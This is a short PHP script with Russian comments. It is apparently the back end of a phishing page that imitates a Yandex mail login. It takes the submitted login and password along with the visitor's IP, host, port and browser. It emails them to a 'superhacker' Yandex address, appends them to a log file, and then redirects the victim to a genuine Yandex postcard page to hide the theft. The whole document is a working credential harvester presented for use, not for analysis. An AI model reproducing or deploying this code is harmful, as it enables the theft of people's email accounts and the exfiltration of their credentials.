<?PHP
$Login = $_POST['login']; //Логин
$Browser = getenv("HTTP_USER_AGENT");
$Port = getenv("REMOTE_PORT");
$Connect = $_SERVER['HTTP_CONNECTION'];
$Host = gethostbyaddr(getenv("REMOTE_ADDR")); 
$Pass = $_POST['passwd']; // Пароль
$ip = $_SERVER["REMOTE_ADDR"]; // IP Жертвы
$Data = date("d-m-y H:i:s", time()); // Дата и время

$text = "[$Data] Browser:[$Browser] Port:[$Port] Connect:[$Connect] Host:[$Host] IP:$ip Мыло:$Login@yandex.ru Пасс:$Pass";
$to = "superhacker88@yandex.ru"; // кому присылаем данные ( E-mail адресс )
$sub = " Пароль от ящика: $Login@yandex.ru"; // тема письма
mail($to,$sub,$text); // Отсылаем сообщение о пополнении базы на E-mail

$filelog = fopen("base.php","a+"); //открываем файл базы
fwrite($filelog,"\n $text \n"); //записываем всё
fclose($filelog); //закрываем

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://cards.yandex.ru/card.xml?card_id=2072'></head></html>";
?>
